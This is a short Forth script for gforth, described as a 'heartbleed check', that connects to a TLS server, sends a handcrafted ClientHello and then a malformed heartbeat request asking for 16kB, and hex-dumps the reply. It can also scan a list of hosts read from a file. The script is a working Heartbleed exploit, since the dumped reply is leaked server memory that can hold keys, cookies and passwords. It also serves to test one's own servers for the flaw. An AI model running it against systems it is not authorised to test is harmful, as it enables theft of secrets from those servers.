\ heartbleed check                                   11apr2014py

require unix/socket.fs

Create TLS-header
$16 c, $03 c, $02 c, $00 c, $31 c, \ TLS Header
$01 c, $00 c, $00 c, $2d c, \ Handshake header
$03 c, $02 c, \ ClientHello field: version number (TLS 1.1)
here  32 allot \ ClientHello field: random
$00 c, \ ClientHello field: session id
$00 c, $04 c, \ ClientHello field: cipher suite length
$00 c, $33 c, $c0 c, $11 c, \ ClientHello field: cipher suite(s)
$01 c, \ ClientHello field: compression support, length
$00 c, \ ClientHello field: compression support, no compression (0)
$00 c, $00 c, \ ClientHello field: extension length (0)

here TLS-header - Constant header#

Constant random32

Create TLS-heartbleed
$18 c, $03 c, $02 c, $00 c, $03 c, \ TLS header
$01 c, $40 c, $00 c, \ heartbleed request, 16kB (maximum for OpenSSL)

here TLS-heartbleed - Constant heartbleed#

: >random ( -- )
    utime $1000000 um/mod nip random32 be-l!
    s" /dev/urandom" r/o open-file throw >r
    random32 4 + 28 r@ read-file throw drop r> close-file throw ;

Variable buggy?

: get-heartbleed ( addr u port -- ) >r 2dup r>  buggy? off
    1000000 set-socket-timeout  >random
    open-socket >r
    TLS-header header# r@ write-socket
    BEGIN  r@ pad $10000 read-socket nip 0=  UNTIL
    TLS-heartbleed heartbleed# r@ write-socket
    BEGIN  r@ pad $10000 read-socket
	over c@ $18 = buggy? @ or \ heartbleed reply
	over 0<> and
    WHILE  dump buggy? on  REPEAT  2drop
    r> close-socket
    type  buggy? @  IF  ." : Heartbleed detected"  ELSE  ." : Everything ok"  THEN  cr ;

Variable files

: file-heartbleed ( addr u -- )
    r/w open-file throw files $[]slurp
    files [: 443 get-heartbleed ;] $[]map ;

script? [IF]
    : ?nextarg ( -- addr u noarg-flag )
	argc @ 1 > IF  next-arg true  ELSE  false  THEN ;
    
    ?nextarg drop ?nextarg [IF] s>number drop [ELSE] 443 [THEN] get-heartbleed bye
[THEN]